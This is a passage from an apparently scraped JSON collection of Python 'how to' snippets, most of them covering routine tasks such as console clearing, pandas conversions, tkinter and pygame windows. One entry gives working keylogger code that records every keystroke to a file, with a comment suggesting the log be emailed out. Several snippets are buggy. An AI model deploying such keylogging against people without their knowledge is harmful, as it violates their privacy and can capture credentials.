    "title": " how to check which submit button is clicked in flask wtf",
    "description": "from flask import Flask, render_template, redirect, url_for from flask_wtf import Form from wtforms import SubmitField  app = Flask(__name__) app.secret_key = 'davidism'  class StatsForm(Form):     user_stats = SubmitField()     room_stats = SubmitField()  @app.route('/stats', methods=['GET', 'POST']) def stats():     form = StatsForm()      if form.validate_on_submit():         if form.user_stats.data:             return redirect(url_for('user_stats'))         elif form.room_stats.data:             return redirect(url_for('room_stats'))      return render_template('stats.html', form=form)  app.run(debug=True)\n",
    "reg_date": "2021-10-12T11:30:07.000Z"
  },
  {
    "id": 1480,
    "keyword": null,
    "link": null,
    "title": " how to clear a command line python",
    "description": "import os  def clearConsole():     command = 'clear'     if os.name in ('nt', 'dos'):  # If Machine is running on Windows, use cls         command = 'cls'     os.system(command)  clearConsole() \n",
    "reg_date": "2021-10-12T11:30:07.000Z"
  },
  {
    "id": 1481,
    "keyword": null,
    "link": null,
    "title": " how to clear checkbox in tkinter",
    "description": "Type Checkbox text variable name here.deselect()\n",
    "reg_date": "2021-10-12T11:30:07.000Z"
  },
  {
    "id": 1482,
    "keyword": null,
    "link": null,
    "title": " how to clear console in repl.it python",
    "description": "#this is the first method import replit replit.clear()  #this is the second method  import os  os.system('clear')\n",
    "reg_date": "2021-10-12T11:30:07.000Z"
  },
  {
    "id": 1483,
    "keyword": null,
    "link": null,
    "title": " how to clear console python",
    "description": "import sys, os  os.system('cls') \nprint('\\033[H\\033[J', end='')\nimport os os.system('cls' if os.name == 'nt' else 'clear')\nimport os os.system('clear')\ndef clear():         # for windows      if name == 'nt':          _ = system('cls')         # for mac and linux(here, os.name is 'posix')      else:          _ = system('clear') \nimport sys  sys.stdout.flush()\n",
    "reg_date": "2021-10-12T11:30:07.000Z"
  },
  {
    "id": 1484,
    "keyword": null,
    "link": null,
    "title": " how to clear the console python",
    "description": "import sys, os  os.system('cls') \nimport os os.system('cls' if os.name == 'nt' else 'clear')\ndef clear():         # for windows      if name == 'nt':          _ = system('cls')         # for mac and linux(here, os.name is 'posix')      else:          _ = system('clear') \n",
    "reg_date": "2021-10-12T11:30:08.000Z"
  },
  {
    "id": 1485,
    "keyword": null,
    "link": null,
    "title": " how to cnovert a decimal to fraction python",
    "description": ">>> from fractions import Fraction >>> Fraction(0.25) Fraction(1, 4)\n",
    "reg_date": "2021-10-12T11:30:08.000Z"
  },
  {
    "id": 1486,
    "keyword": null,
    "link": null,
    "title": " how to code a clickable button in python",
    "description": "from tkinter import * master = Tk() def close_window():     exit() button = Button(master, text = 'Click me', command = close_window) button.pack() mainloop() \nimport tkinter as tk       def write_slogan():     print(\"Tkinter is easy to use!\")  root = tk.Tk() frame = tk.Frame(root) frame.pack()  button = tk.Button(frame,                     text=\"QUIT\",                     fg=\"red\",                    command=quit) button.pack(side=tk.LEFT) slogan = tk.Button(frame,                    text=\"Hello\",                    command=write_slogan) slogan.pack(side=tk.LEFT)  root.mainloop() \n",
    "reg_date": "2021-10-12T11:30:08.000Z"
  },
  {
    "id": 1487,
    "keyword": null,
    "link": null,
    "title": " how to code a tic tac toe game with ai python",
    "description": "#Tic Tac Toe game in python by techwithtim  board = [' ' for x in range(10)]  def insertLetter(letter, pos):     board[pos] = letter  def spaceIsFree(pos):     return board[pos] == ' '  def printBoard(board):     print('   |   |')     print(' ' + board[1] + ' | ' + board[2] + ' | ' + board[3])     print('   |   |')     print('-----------')     print('   |   |')     print(' ' + board[4] + ' | ' + board[5] + ' | ' + board[6])     print('   |   |')     print('-----------')     print('   |   |')     print(' ' + board[7] + ' | ' + board[8] + ' | ' + board[9])     print('   |   |')      def isWinner(bo, le):     return (bo[7] == le and bo[8] == le and bo[9] == le) or (bo[4] == le and bo[5] == le and bo[6] == le) or(bo[1] == le and bo[2] == le and bo[3] == le) or(bo[1] == le and bo[4] == le and bo[7] == le) or(bo[2] == le and bo[5] == le and bo[8] == le) or(bo[3] == le and bo[6] == le and bo[9] == le) or(bo[1] == le and bo[5] == le and bo[9] == le) or(bo[3] == le and bo[5] == le and bo[7] == le)  def playerMove():     run = True     while run:         move = input('Please select a position to place an \\'X\\' (1-9): ')         try:             move = int(move)             if move > 0 and move < 10:                 if spaceIsFree(move):                     run = False                     insertLetter('X', move)                 else:                     print('Sorry, this space is occupied!')             else:                 print('Please type a number within the range!')         except:             print('Please type a number!')               def compMove():     possibleMoves = [x for x, letter in enumerate(board) if letter == ' ' and x != 0]     move = 0      for let in ['O', 'X']:         for i in possibleMoves:             boardCopy = board[:]             boardCopy[i] = let             if isWinner(boardCopy, let):                 move = i                 return move      cornersOpen = []     for i in possibleMoves:         if i in [1,3,7,9]:             cornersOpen.append(i)                  if len(cornersOpen) > 0:         move = selectRandom(cornersOpen)         return move      if 5 in possibleMoves:         move = 5         return move      edgesOpen = []     for i in possibleMoves:         if i in [2,4,6,8]:             edgesOpen.append(i)                  if len(edgesOpen) > 0:         move = selectRandom(edgesOpen)              return move  def selectRandom(li):     import random     ln = len(li)     r = random.randrange(0,ln)     return li[r]       def isBoardFull(board):     if board.count(' ') > 1:         return False     else:         return True  def main():     print('Welcome to Tic Tac Toe!')     printBoard(board)      while not(isBoardFull(board)):         if not(isWinner(board, 'O')):             playerMove()             printBoard(board)         else:             print('Sorry, O\\'s won this time!')             break          if not(isWinner(board, 'X')):             move = compMove()             if move == 0:                 print('Tie Game!')             else:                 insertLetter('O', move)                 print('Computer placed an \\'O\\' in position', move , ':')                 printBoard(board)         else:             print('X\\'s won this time! Good Job!')             break      if isBoardFull(board):         print('Tie Game!')  while True:     answer = input('Do you want to play again? (Y/N)')     if answer.lower() == 'y' or answer.lower == 'yes':         board = [' ' for x in range(10)]         print('-----------------------------------')         main()     else:         break\n",
    "reg_date": "2021-10-12T11:30:08.000Z"
  },
  {
    "id": 1488,
    "keyword": null,
    "link": null,
    "title": " how to code hello world",
    "description": "public class Hello {   \tpublic static void main(String[] args)     {       /*Tip System.out.println(); shortcut Type 'sysout'and press Tab */       System.out.println(\"Hello world!\");     } }\npublic static void main(String[] args){   System.out.println(\"Hello World\"); }\nprint(\"Hello World\")\n cout << \"Hello world!\" <<endl;\n",
    "reg_date": "2021-10-12T11:30:08.000Z"
  },
  {
    "id": 1489,
    "keyword": null,
    "link": null,
    "title": " how to code in python",
    "description": "#if its your first time start with this print(\"hello world\") #now learn about input input(\"whats your name\") #if statements and variables run = True if run == True:   print(\"hi\") #now lets combine our knowledge print(\"Whats your name\") name = input(\"\") print(\"Hello, \" + name) \n#the best way to start with anything is not to rush and start with the basics #python however is really good for begginers as it is easy to read and understaned #and has relatively easy syntax so dont spend a lot of time on the basics like #print() and if  rather learn the basics and learn about the libraries  #and a good way to learn about the libraries is https://pypi.org/ if you are also #struggling to find motivation for programming the best way to work around it is #to learn how dopamine works in your brain and how to use it in progoramming #for that use the video https://www.youtube.com/watch?v=9QiE-M1LrZk #for a good IDE i reccomend pycharm #and remember programming is not something you should remember to be good  #programming is something you need to understand and to be a good programmer you  # need to know how to put the internet to a good use and to know where to search  #if this helped leave it an upvote  #rubel1130 :)\n\"\"\" Great foundation for basics  https://www.w3schools.com/python/default.asp\" \"\"\"\nbruh i just wanted to know the formula thing to get the title to be like ****yo*****\n",
    "reg_date": "2021-10-12T11:30:08.000Z"
  },
  {
    "id": 1490,
    "keyword": null,
    "link": null,
    "title": " how to color print in python",
    "description": "def colored(r, g, b, text):     return \"\\033[38;2;{};{};{}m{} \\033[38;2;255;255;255m\".format(r, g, b, text)    text = 'Hello, World' colored_text = colored(255, 0, 0, text) print(colored_text)  #or  print(colored(255, 0, 0, 'Hello, World'))\nclass bcolors:     HEADER = '\\033[95m'     OKBLUE = '\\033[94m'     OKGREEN = '\\033[92m'     WARNING = '\\033[93m'     FAIL = '\\033[91m'     ENDC = '\\033[0m'     BOLD = '\\033[1m'     UNDERLINE = '\\033[4m'  print(f\"{bcolors.WARNING}Error : Test message !{bcolors.ENDC}\")\n#pip install termcolor from termcolor import cprint  cprint('Hello, World! In yellow highlighted in red!', 'yellow', 'on_red') cprint('Hello, World! Underlined in red!', 'red', attrs=[\"underline\"])\n# Python program to print  # green text with red background   #pip install termcolor #pip install colorama    from colorama import init  from termcolor import colored     init()     print(colored('Hello, World!', 'green', 'on_red')) \nprint(\"\\033[0;37;40m Normal text\\n\") print(\"\\033[2;37;40m Underlined text\\033[0;37;40m \\n\") print(\"\\033[1;37;40m Bright Colour\\033[0;37;40m \\n\") print(\"\\033[3;37;40m Negative Colour\\033[0;37;40m \\n\") print(\"\\033[5;37;40m Negative Colour\\033[0;37;40m\\n\")   print(\"\\033[1;37;40m \\033[2;37:40m TextColour BlackBackground          TextColour GreyBackground                WhiteText ColouredBackground\\033[0;37;40m\\n\") print(\"\\033[1;30;40m Dark Gray      \\033[0m 1;30;40m            \\033[0;30;47m Black      \\033[0m 0;30;47m               \\033[0;37;41m Black      \\033[0m 0;37;41m\") print(\"\\033[1;31;40m Bright Red     \\033[0m 1;31;40m            \\033[0;31;47m Red        \\033[0m 0;31;47m               \\033[0;37;42m Black      \\033[0m 0;37;42m\") print(\"\\033[1;32;40m Bright Green   \\033[0m 1;32;40m            \\033[0;32;47m Green      \\033[0m 0;32;47m               \\033[0;37;43m Black      \\033[0m 0;37;43m\") print(\"\\033[1;33;40m Yellow         \\033[0m 1;33;40m            \\033[0;33;47m Brown      \\033[0m 0;33;47m               \\033[0;37;44m Black      \\033[0m 0;37;44m\") print(\"\\033[1;34;40m Bright Blue    \\033[0m 1;34;40m            \\033[0;34;47m Blue       \\033[0m 0;34;47m               \\033[0;37;45m Black      \\033[0m 0;37;45m\") print(\"\\033[1;35;40m Bright Magenta \\033[0m 1;35;40m            \\033[0;35;47m Magenta    \\033[0m 0;35;47m               \\033[0;37;46m Black      \\033[0m 0;37;46m\") print(\"\\033[1;36;40m Bright Cyan    \\033[0m 1;36;40m            \\033[0;36;47m Cyan       \\033[0m 0;36;47m               \\033[0;37;47m Black      \\033[0m 0;37;47m\") print(\"\\033[1;37;40m White          \\033[0m 1;37;40m            \\033[0;37;40m Light Grey \\033[0m 0;37;40m               \\033[0;37;48m Black      \\033[0m 0;37;48m\")   \\n\") \nprint(f\"{bcolors.WARNING}Warning: No active frommets remain. Continue?{bcolors.ENDC}\")\n",
    "reg_date": "2021-10-12T11:30:08.000Z"
  },
  {
    "id": 1491,
    "keyword": null,
    "link": null,
    "title": " how to connect postgres database to python",
    "description": "import psycopg2 try:     connection = psycopg2.connect(user = \"sysadmin\",                                   password = \"pynative@#29\",                                   host = \"127.0.0.1\",                                   port = \"5432\",                                   database = \"postgres_db\")      cursor = connection.cursor()     # Print PostgreSQL Connection properties     print ( connection.get_dsn_parameters(),\"\\n\")      # Print PostgreSQL version     cursor.execute(\"SELECT version();\")     record = cursor.fetchone()     print(\"You are connected to - \", record,\"\\n\")  except (Exception, psycopg2.Error) as error :     print (\"Error while connecting to PostgreSQL\", error) finally:     #closing database connection.         if(connection):             cursor.close()             connection.close()             print(\"PostgreSQL connection is closed\")\nimport psycopg2 from psycopg2 import Error  try:     connection = psycopg2.connect(user = \"postgres\",                                   password = \"pass@#29\",                                   host = \"127.0.0.1\",                                   port = \"5432\",                                   database = \"postgres_db\")      cursor = connection.cursor()          create_table_query = '''CREATE TABLE mobile           (ID INT PRIMARY KEY     NOT NULL,           MODEL           TEXT    NOT NULL,           PRICE         REAL); '''          cursor.execute(create_table_query)     connection.commit()     print(\"Table created successfully in PostgreSQL \")  except (Exception, psycopg2.DatabaseError) as error :     print (\"Error while creating PostgreSQL table\", error) finally:     #closing database connection.         if(connection):             cursor.close()             connection.close()             print(\"PostgreSQL connection is closed\")\n",
    "reg_date": "2021-10-12T11:30:08.000Z"
  },
  {
    "id": 1492,
    "keyword": null,
    "link": null,
    "title": " how to convert a am pm string to 24 hrs time python",
    "description": "a='' def timeConversion(s):    if s[-2:] == \"AM\" :       if s[:2] == '12':           a = str('00' + s[2:8])       else:           a = s[:-2]    else:       if s[:2] == '12':           a = s[:-2]       else:           a = str(int(s[:2]) + 12) + s[2:8]    return a   s = '11:05:45AM' result = timeConversion(s) print(result)\n>>> from datetime import * >>> m2 = '1:35 PM' >>> m2 = datetime.strptime(m2, '%I:%M %p') >>> print(m2) 1900-01-01 13:35:00\n",
    "reg_date": "2021-10-12T11:30:08.000Z"
  },
  {
    "id": 1493,
    "keyword": null,
    "link": null,
    "title": " how to convert a list into a dataframe in python",
    "description": "from pandas import DataFrame  People_List = ['Jon','Mark','Maria','Jill','Jack']  df = DataFrame (People_List,columns=['First_Name']) print (df) \n# import pandas as pd  import pandas as pd     # list of strings  lst = ['Geeks', 'For', 'Geeks', 'is',               'portal', 'for', 'Geeks']     # Calling DataFrame constructor on list  df = pd.DataFrame(lst)  df \nimport pandas as pd from pandas import DataFrame df = DataFrame(lst,columns=['num'])\n",
    "reg_date": "2021-10-12T11:30:08.000Z"
  },
  {
    "id": 1494,
    "keyword": null,
    "link": null,
    "title": " how to convert a pyw to exe",
    "description": "#if you dont have pyinstaller so run the cmd (winkey + r and write cmd and enter) #now run the command bellow  \tpip install pyinstaller      #now run this  \tpyinstaller -w file_name.pyw     #if you want the exe to be in one file without other folders      #change the code to: pyinstaller -w --onefile file_name.pyw           #change file_name to your file's name and if you aren't running the cmd in the #same directory so instead of the file's name write the all path #now you will have a directory named Build and in it you will find your exe file #note - if your pyw filw has dependents so they will be in the file so dont remove them\n",
    "reg_date": "2021-10-12T11:30:08.000Z"
  },
  {
    "id": 1495,
    "keyword": null,
    "link": null,
    "title": " how to convert an image to ascii art using python",
    "description": "# please subscribe my channel - https://bit.ly/2Me2CfB  import pywhatkit  pywhatkit.image_to_ascii_art('image.jpg')\n",
    "reg_date": "2021-10-12T11:30:09.000Z"
  },
  {
    "id": 1496,
    "keyword": null,
    "link": null,
    "title": " how to convert character to factor in python",
    "description": "pd.factorize(df.b)\n",
    "reg_date": "2021-10-12T11:30:09.000Z"
  },
  {
    "id": 1497,
    "keyword": null,
    "link": null,
    "title": " how to convert column to index in pandas",
    "description": "df.reset_index(inplace=True)\nmyDataFrame.set_index('column_name')\n",
    "reg_date": "2021-10-12T11:30:09.000Z"
  },
  {
    "id": 1498,
    "keyword": null,
    "link": null,
    "title": " how to convert data type of a column in pandas",
    "description": "# convert all columns of DataFrame df = df.apply(pd.to_numeric) # convert all columns of DataFrame  # convert just columns \"a\" and \"b\" df[[\"a\", \"b\"]] = df[[\"a\", \"b\"]].apply(pd.to_numeric)\n# You can use \"astype\" method # suppose you want to correct your \"sales\" column data type df['sales'] = df['sales'].astype('float64')\n>>> df.astype({'col1': 'int32'}).dtypes col1    int32 col2    int64 dtype: object\n# convert all columns of DataFrame df = df.apply(pd.to_numeric) # convert all columns of DataFrame  # convert just columns \"a\" and \"b\" df[[\"a\", \"b\"]] = df[[\"a\", \"b\"]].apply(pd.to_numeric) \n",
    "reg_date": "2021-10-12T11:30:09.000Z"
  },
  {
    "id": 1499,
    "keyword": null,
    "link": null,
    "title": " how to convert dataframe to list in python",
    "description": "from pandas import DataFrame  People_List = ['Jon','Mark','Maria','Jill','Jack']  df = DataFrame (People_List,columns=['First_Name']) print (df) \ndf.values.tolist() \n# import pandas as pd  import pandas as pd     # list of strings  lst = ['Geeks', 'For', 'Geeks', 'is',               'portal', 'for', 'Geeks']     # Calling DataFrame constructor on list  df = pd.DataFrame(lst)  df \nL = ['Thanks You', 'Its fine no problem', 'Are you sure']  #create new df  df = pd.DataFrame({'col':L}) print (df)                     col 0           Thanks You 1  Its fine no problem 2         Are you sure\n# import pandas as pd   import pandas as pd  # list of strings  lst = ['fav', 'tutor', 'coding', 'skills'] # Calling DataFrame constructor on list  df = pd.DataFrame(lst)  print(df)  \n",
    "reg_date": "2021-10-12T11:30:09.000Z"
  },
  {
    "id": 1500,
    "keyword": null,
    "link": null,
    "title": " how to convert days into seconds in python using time.time()",
    "description": "days = input(\"Number of days\\n\") seconds = days * 24 * 60 * 60 # your answer :) print(seconds) # you can check this by printing, if you want...\ndef show_time(time):         time = int(time)         day = time // (24 * 3600)         time = time % (24 * 3600)         hour = time // 3600         time %= 3600         minutes = time // 60         time %= 60         seconds = time         if day != 0:                 return \"%dD %dH %dM %dS\" % (day, hour, minutes, seconds)         elif day == 0 and hour != 0:                 return \"%dH %dM %dS\" % (hour, minutes, seconds)         elif day == 0 and hour == 0 and minutes != 0:                 return \"%dM %dS\" % (minutes, seconds)         else:                 return \"%dS\" % (seconds)  print(show_time(12345))\n",
    "reg_date": "2021-10-12T11:30:09.000Z"
  },
  {
    "id": 1501,
    "keyword": null,
    "link": null,
    "title": " how to convert dollars to rupees and rs to dollar in python",
    "description": "print('hello welcome to converter of rs to dollar and dollar to rs')  print()  carry_on = True while carry_on:     try:         ask = int(input('write what do you want to do find? for finding dollar to rs type \"1\"   or to find rs to dollar write \"2\":- '))     except ValueError:         print('inccorrect input')          if ask == 1:         try:             dollars = float(input(\"Please enter dollars value:\"))             converter = dollars * 72.90             print(converter,\"Rupees\")         except ValueError:             print('incorrect input')                  elif ask == 2:             rupees = float(input(\"Please enter rupees:\"))         dollars_converter = rupees / 72.90         print(dollars_converter, \" Dollars\")          else:         print('incorrect input')          User_think = input('Do you want to cotinue? write \"1 or one\" if you want to continue or \"2 or two\" to exit:- ').upper()     if User_think == 1 or \"ONE\":         go = True     elif User_think == 2 or \"TWO\":         go = False     else:         print('wront input closing the software')         go = False\n",
    "reg_date": "2021-10-12T11:30:09.000Z"
  },
  {
    "id": 1502,
    "keyword": null,
    "link": null,
    "title": " how to convert fahrenheit to celsius in python",
    "description": " #!/usr/bin/env python Celsius = int(raw_input(\"Enter a temperature in Celsius: \"))  Fahrenheit = 9.0/5.0 * Celsius + 32  print \"Temperature:\", Celsius, \"Celsius = \", Fahrenheit, \" F\" \n#!/usr/bin/env python Fahrenheit = int(raw_input(\"Enter a temperature in Fahrenheit: \"))  Celsius = (Fahrenheit - 32) * 5.0/9.0  print \"Temperature:\", Fahrenheit, \"Fahrenheit = \", Celsius, \" C\" \n",
    "reg_date": "2021-10-12T11:30:09.000Z"
  },
  {
    "id": 1503,
    "keyword": null,
    "link": null,
    "title": " how to convert kg to g using python",
    "description": "try:     Kg = int(input(\"kg:- \"))     To_gram = 1000*Kg     print(Kg,\"Kg = \",To_gram,\"G\") except:     print(\"Mile's must be number\")\n",
    "reg_date": "2021-10-12T11:30:10.000Z"
  },
  {
    "id": 1504,
    "keyword": null,
    "link": null,
    "title": " how to convert list into csv in python",
    "description": "import pandas as pd      list1 = [1,2,3,4,5] df = pd.DataFrame(list1) df.to_csv('filename.csv', index=False)  #index =false removes unnecessary indexing/numbering in the csv\nimport csv  with open(\"out.csv\", \"w\", newline=\"\") as f:     writer = csv.writer(f)     writer.writerows(a)\nopen('file.csv', 'r').read().splitlines() #assuming you want each row to be an individual element in the list\n",
    "reg_date": "2021-10-12T11:30:10.000Z"
  },
  {
    "id": 1505,
    "keyword": null,
    "link": null,
    "title": " how to convert list into string in python",
    "description": "list1 = [1, 2, 3] str1 = ''.join(str(e) for e in list1)\n# Python program to convert a list  # to string using list comprehension      s = ['I', 'want', 4, 'apples', 'and', 18, 'bananas']     # using list comprehension  listToStr = ' '.join([str(elem) for elem in s])     print(listToStr)  \nlist_of_num = [1, 2, 3, 4, 5] # Covert list of integers to a string full_str = ' '.join([str(elem) for elem in list_of_num]) print(full_str)\nList = [\"ITEM1\", \"ITEM2\", \"ITEM3\"] string_version = \"\".join(List)  print(string_version) \n>>> L = [1,2,3]        >>> \" \".join(str(x) for x in L) '1 2 3'\nlist1 = ['1', '2', '3'] str1 = ''.join(list1)\n",
    "reg_date": "2021-10-12T11:30:10.000Z"
  },
  {
    "id": 1506,
    "keyword": null,
    "link": null,
    "title": " how to convert local scope to global scope in python",
    "description": "#local scope enemy = 5 def increase_enemy():     enemy = 10     return (f\"enemy inside the function {enemy}\")  print(increase_enemy()) print(f\"Enemy out side the function {enemy}\")  #converting local scope to global scope enemy = 5 def increase_enemy():     global enemy     enemy = 10     return (f\"enemy inside the function {enemy}\")  print(increase_enemy()) print(f\"Enemy out side the function {enemy}\")\n",
    "reg_date": "2021-10-12T11:30:10.000Z"
  },
  {
    "id": 1507,
    "keyword": null,
    "link": null,
    "title": " how to convert string to byte without encoding python",
    "description": ">>> message = 'test 112 hello: what?!' >>> message = message.encode('iso-8859-15') >>> message  b'test 112 hello: what?!' \nimport struct  def rawbytes(s):     \"\"\"Convert a string to raw bytes without encoding\"\"\"     outlist = []     for cp in s:         num = ord(cp)         if num < 255:             outlist.append(struct.pack('B', num))         elif num < 65535:             outlist.append(struct.pack('>H', num))         else:             b = (num & 0xFF0000) >> 16             H = num & 0xFFFF             outlist.append(struct.pack('>bH', b, H))     return b''.join(outlist) \n",
    "reg_date": "2021-10-12T11:30:10.000Z"
  },
  {
    "id": 1508,
    "keyword": null,
    "link": null,
    "title": " how to convert user integer input to string in python",
    "description": "int_input = str(input(\"Write a number:- \")) print(type(int_input))\n",
    "reg_date": "2021-10-12T11:30:10.000Z"
  },
  {
    "id": 1509,
    "keyword": null,
    "link": null,
    "title": " how to count post by category django",
    "description": "#views.py from django.db.models import Count # You should change post in Count function based on your model. categories = Category.objects.all().annotate(posts_count=Count('post'))  #Then you will have access to number of posts for each category: for category in categories:     print(category.posts_count)  #in your template {% for category in categories %}       <p>Number of posts: {{category.posts_count}}</p> {% endfor %} \n",
    "reg_date": "2021-10-12T11:30:10.000Z"
  },
  {
    "id": 1510,
    "keyword": null,
    "link": null,
    "title": " how to create a datetime object in python",
    "description": "from datetime import datetime as d date = d.now() print(date.strftime(\"%Y-%m-%d %H:%M:%S\"))\nimport datetime  date = datetime.datetime(2/9/2021) print(x) \n",
    "reg_date": "2021-10-12T11:30:10.000Z"
  },
  {
    "id": 1511,
    "keyword": null,
    "link": null,
    "title": " how to create a hotkey in python",
    "description": "import keyboard import time # Using time.sleep, we can dramatically decrease the amount of CPU our program # uses.  hotkey = \"shift + ctrl + F2\" # Remember that the order in which the hotkey is set up is the order you # need to press the keys.  while True:   if keyboard.is_pressed(hotkey):     print(\"Hotkey is being pressed\")     time.sleep(0.05)   time.sleep(0.01)\n",
    "reg_date": "2021-10-12T11:30:10.000Z"
  },
  {
    "id": 1512,
    "keyword": null,
    "link": null,
    "title": " how to create a keylogger in python",
    "description": "import logging import os from pynput.keyboard import Listener  log_Directory = os.getcwd() + '/'  # where save file print(os.getcwd()) # directory # create file  logging.basicConfig(filename=(log_Directory + \"key_log.txt\"), level=logging.DEBUG, format='%(asctime)s: %(message)s')  # function in logging def on_press(key):     logging.info(key)     # when press key save the key in file   with Listener(on_press=on_press) as listener:     listener.join()  # infinite cicle\n#pip install pynput OR python3 -m pip install pynput #ONLY ONE MODULE REQUIRED from pynput.keyboard import Listener #add \", Key\" here if you want to be able to act when keys like Enter and esc are pressed) #you can use the yagmail python module to email yourself the log with a gmail account when a key is pressed (if key.char == ... OR if key=Key.(esc, enter, shift)) file = open(\"log.txt\", \"a\") #save to the current directory. To save to another location use r'C:\\Users\\k\\t\\m\\etc\\log.txt' #NOTE - it does not matter if \"log.txt\" exists or not. Python will automatically create that file. def on_press(key):   try:     file.write(f'\\n{key}')     file.flush() #save changes   except:     pass #ignore all errors listener = Listener(on_press=on_press) #you can also use \"with listener as Listener(on_press...):\" listener.start() listener.join()\n",
    "reg_date": "2021-10-12T11:30:10.000Z"
  },
  {
    "id": 1513,
    "keyword": null,
    "link": null,
    "title": " how to create a list from csv python",
    "description": "import csv  with open('file.csv', newline='') as f:     reader = csv.reader(f)     data = list(reader)  print(data) \n# Convert a list into rows for a column in csv  import csv for_example = [1, 2, 3, 4, 5, 6] with open('output.csv', 'w', newline='') as csv_1:   csv_out = csv.writer(csv_1)   csv_out.writerows([for_example[index]] for index in range(0, len(for_example))) \n",
    "reg_date": "2021-10-12T11:30:11.000Z"
  },
  {
    "id": 1514,
    "keyword": null,
    "link": null,
    "title": " how to create a loop for multiple players turn",
    "description": "num = 0 num_of_plyrs = 4 count = 0 stop = False  while not stop:     if count == 4:         stop = True     if num != num_of_plyrs:         num += 1         count += 1         print(\"It's Player {0}'s\".format(num))     elif num == num_of_plyrs:         num = 0\n",
    "reg_date": "2021-10-12T11:30:11.000Z"
  },
  {
    "id": 1515,
    "keyword": null,
    "link": null,
    "title": " how to create a loop in python turtle",
    "description": "for i in range(10):     print(i) \n",
    "reg_date": "2021-10-12T11:30:11.000Z"
  },
  {
    "id": 1516,
    "keyword": null,
    "link": null,
    "title": " how to create a password generator in python",
    "description": "import string from random import * characters = string.ascii_letters + string.punctuation  + string.digits password =  \"\".join(choice(characters) for x in range(randint(8, 16))) print password \nimport random chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@&pound;$%^&*().,?0123456789'  number = input('Please enter a number of passwords.') try:     number = int(number) except:     print(\"Error, please enter a number!\")  length = input('Length of password?') try:     length = int(length) except:     print(\"Error, please enter a number!\")  print('\\nHere are your password(s):')  for pwd in range(number):   password = ''   for c in range(length):     password += random.choice(chars)   print(password)\nimport random  alph = list('ABCDEFGHIJKLMNOPQRSTUVWXYZ\\              abcdefghijklmnopqrstuvwxyz\\              1234567890 !@#$%^&*(){}[]<>,.') out = '' for char in string:     out += random.choice(alph)      print(out)\n#This is giving you a password with 8 strings and 4 numbers: import random i=0  list=[] while i < 12:     while i < 8:         list.append(random.choice(string.ascii_letters))         i+=1     while i < 12:         list.append(random.randint(0, 9))         i+=1      list=' '.join([str(elem) for elem in list]) print(\"Your new password: \", list.replace(\" \", \"\"))\nimport random import string  x = str(input(\"Do you want a password? y/n \"))  list = [] if x == \"y\":     print(\"Alright!\")     for i in range(16):         _1 = random.choice(string.ascii_letters)         _2 = random.randint(1, 9)         list.append(_1)         list.append(_2) else:     print(\"ok\")   def convert(list):             s = [str(i) for i in list]             res = \"\".join(s)             return(print(res))    convert(list)  \n#Simple Way To Make Password Generator #NickSiteCoder import random  characters = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789!@&euro;$#%({)}],/<\\.>[*^&\"  while 1:     length = int(input(\"What length would you like your password to be ? :\"))     count = int(input(\"How many passwords would you like ? \"))     for x in range(0, count):         password = \"\"         for x in range(0,password_len):             password_characters = random.choice(characters)             password      = password + password_characters         print(\"Here is your password : \",password)\n",
    "reg_date": "2021-10-12T11:30:11.000Z"
  },
  {
    "id": 1517,
    "keyword": null,
    "link": null,
    "title": " how to create a pygame window",
    "description": "import pygame pygame.init() back = (192,192,192) gameDisplay = pygame.display.set_mode((800,600)) pygame.display.set_caption('A bit Racey') gameDisplay.fill(back) clock = pygame.time.Clock() running = True while running:     for event in pygame.event.get():         if event.type == pygame.QUIT:             running = False     pygame.display.update()     clock.tick(60)    pygame.quit() quit()              \nimport pygame background_colour = (255,255,255) (width, height) = (300, 200) screen = pygame.display.set_mode((width, height)) pygame.display.set_caption('Tutorial 1') screen.fill(background_colour) pygame.display.flip() running = True while running:   for event in pygame.event.get():     if event.type == pygame.QUIT:       running = False\nimport pygame pygame.init() #initialize pygame SCREEN_WIDTH = 600 # width (in px) SCREEN_HEIGHT = 800 # height (in px)  WIN = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT)) # creates a screen of 600px X 800px  while True: \tpygame.display.update() # updates the screen\nimport pygame  # The background color can be whatever you want background_colour = (255,255,255) (width, height) = (300, 200) screen = pygame.display.set_mode((width, height)) pygame.display.set_caption('Tutorial 1') screen.fill(background_colour) pygame.display.flip() running = True while running:   for event in pygame.event.get():     if event.type == pygame.QUIT:       running = False\n",
    "reg_date": "2021-10-12T11:30:11.000Z"
  },
  {
    "id": 1518,
    "keyword": null,
    "link": null,
    "title": " how to create a python venv",
    "description": "#------FOR LINUX/MAC---------# #installing venv  sudo apt-get install python3.6-venv #creating virtual env python3 -m venv env #activating virtual env source env/bin/activate   #-------FOR WINDOWS----------# #installing venv py -m pip install --user virtualenv #creating virtual env py -m venv env #activating virtual env .\\env\\Scripts\\activate \npython3 -m venv tutorial-env\npython3 -m venv tutorial-env \n",
    "reg_date": "2021-10-12T11:30:11.000Z"
  },
  {
    "id": 1519,
    "keyword": null,
    "link": null,
    "title": " how to create a random number between 1 and 10 in python",
    "description": "smallest = 0 largest = 100  random_number = random.randint(smallest, largest - 1)\nimport random n = random.randint(0,22) print(n)  # Output: 2\n",
    "reg_date": "2021-10-12T11:30:11.000Z"
  },
  {
    "id": 1520,
    "keyword": null,
    "link": null,
    "title": " how to create a scoreboard for the top 5 players in python",
    "description": "",
    "reg_date": "2021-10-12T11:30:11.000Z"
  },
  {
    "id": 1521,
    "keyword": null,
    "link": null,
    "title": " how to create a tkinter window",
    "description": "from tkinter import *  mywindow = Tk() #Change the name for every window you make mywindow.title(\"New Project\") #This will be the window title mywindow.geometry(\"780x640\") #This will be the window size (str) mywindow.minsize(540, 420) #This will be set a limit for the window's minimum size (int) mywindow.configure(bg=\"blue\") #This will be the background color  mywindow.mainloop() #You must add this at the end to show the window\n#Creating Tkinter Window In Python:  from tkinter import *  new_window = Tk() #Create a window ; spaces should be denoted with underscores ; every window should have a different name new_window.title(\"My Python Project\") #Name of screen ; name should be the one which you already declared (new_window) new_window.geometry(\"200x150\") #Resizes the default window size new_window.configure(bg = \"red\") #Gives color to the background  new_window.mainloop() #Shows the window on the screen\n#!/usr/bin/python  import Tkinter top = Tkinter.Tk() # Code to add widgets will go here... top.mainloop()\n",
    "reg_date": "2021-10-12T11:30:11.000Z"
  },
  {
    "id": 1522,
    "keyword": null,
    "link": null,
    "title": " how to create a virtual environment in python ubuntu",
